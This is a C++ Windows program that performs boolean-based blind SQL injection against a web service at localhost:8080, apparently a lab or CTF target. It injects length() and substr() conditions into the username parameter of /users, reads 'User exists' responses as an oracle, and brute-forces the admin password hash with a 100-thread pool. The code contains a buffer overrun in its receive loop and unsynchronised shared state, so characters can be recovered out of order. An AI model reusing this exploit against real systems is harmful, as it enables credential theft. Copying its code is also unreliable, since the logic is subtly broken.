#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <queue>
#include <functional>
#include <condition_variable> 

#pragma comment(lib, "ws2_32.lib")

struct HttpRequestResult {
    std::string response;
    int status;
};

HttpRequestResult sendHttpRequest(const char *hostname, const char *port, const char *request) {
    std::cout << "Sending request: " << request << std::endl; // Print the request
    HttpRequestResult result;
    WSADATA wsaData;
    result.status = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result.status != 0) {
        std::cerr << "WSAStartup failed.\n";
        return result;
    }

    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *resultAddr = NULL, *ptr = NULL, hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    result.status = getaddrinfo(hostname, port, &hints, &resultAddr);
    if (result.status != 0) {
        std::cerr << "getaddrinfo failed: " << result.status << "\n";
        WSACleanup();
        return result;
    }

    for (ptr = resultAddr; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            std::cerr << "Error at socket(): " << WSAGetLastError() << "\n";
            freeaddrinfo(resultAddr);
            WSACleanup();
            return result;
        }

        result.status = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (result.status == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(resultAddr);

    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Unable to connect to server!\n";
        WSACleanup();
        return result;
    }

    result.status = send(ConnectSocket, request, (int)strlen(request), 0);
    if (result.status == SOCKET_ERROR) {
        std::cerr << "send failed: " << WSAGetLastError() << "\n";
        closesocket(ConnectSocket);
        WSACleanup();
        return result;
    }

    char recvbuf[4096];
    int bytesReceived = 0;
    std::string response;
    while ((bytesReceived = recv(ConnectSocket, recvbuf, 4096, 0)) > 0) {
        recvbuf[bytesReceived] = '\0';
        response += recvbuf;
    }

    result.response = response;
    std::cout << "Response: " << result.response << std::endl;

    closesocket(ConnectSocket);
    WSACleanup();

    return result;
}

class ThreadPool {
public:
    ThreadPool(size_t threads) : stop(false) {
        for (size_t i = 0; i < threads; ++i)
            workers.emplace_back([this] {
                for (;;) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(this->mtx);
                        this->condition.wait(lock, [this] { return this->stop || !this->tasks.empty(); });
                        if (this->stop && this->tasks.empty())
                            return;
                        task = std::move(this->tasks.front());
                        this->tasks.pop();
                    }
                    task();
                }
            });
    }

    template <class F>
    void enqueue(F &&f) {
        {
            std::unique_lock<std::mutex> lock(mtx);
            tasks.emplace(std::forward<F>(f));
        }
        condition.notify_one();
    }

    ~ThreadPool() {
        {
            std::unique_lock<std::mutex> lock(mtx);
            stop = true;
        }
        condition.notify_all();
        for (std::thread &worker : workers)
            worker.join();
    }

private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex mtx;
    std::condition_variable condition;
    bool stop;
};

std::string getAdminHashedPassword(int passwordLength, std::string &hashedPassword) {
    const char *hostname = "localhost";
    const char *port = "8080";
    std::string request = "GET /users?username=admin%27%20and%20substr(password,";
    const std::string endRequest = " HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n";
    const std::string symbols = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

    ThreadPool pool(100); 

    for (int i = 1; i <= passwordLength; ++i) {
        bool found = false;
        for (char c : symbols) {
            pool.enqueue([hostname, port, request, endRequest, symbols, i, passwordLength, &hashedPassword, c, &found]() { 
                if (!found) {
                    std::string req = request + std::to_string(i) + ",1)%20=%20%27" + c + endRequest;
                    HttpRequestResult result = sendHttpRequest(hostname, port, req.c_str());
                    if (result.response.find("User exists") != std::string::npos) {
                        hashedPassword += c;
                        if (hashedPassword.size() == passwordLength) {
                            found = true;
                        }
                    }
                }
            });
            if (found) break;
        }
        if (found) break;
    }

    return hashedPassword;
}

int getAdminPasswordLength() {
    const char *hostname = "localhost";
    const char *port = "8080";
    std::string request = "GET /users?username=admin%27%20and%20length(password)%20=%20%27";
    const std::string endRequest = " HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n";
    for (int i = 39; i <= 256; ++i) {
        std::string len = std::to_string(i);
        std::string req = request + len + endRequest;
        HttpRequestResult result = sendHttpRequest(hostname, port, req.c_str());
        if (result.response.find("User exists") != std::string::npos) {
            return i;
        }
    }
    return -1;
}

int main() {
    int passwordLength = getAdminPasswordLength();
    if (passwordLength != -1) {
        std::cout << "Admin password length: " << passwordLength << std::endl;
        std::string hashedPassword;
        getAdminHashedPassword(passwordLength, hashedPassword);
        if (!hashedPassword.empty()) {
            std::cout << "Admin hashed password: " << hashedPassword << std::endl;
        }
        else {
            std::cerr << "Failed to get admin hashed password\n";
            return 1;
        }
    }
    else {
        std::cerr << "Failed to get admin password length\n";
        return 1;
    }

    return 0;
}
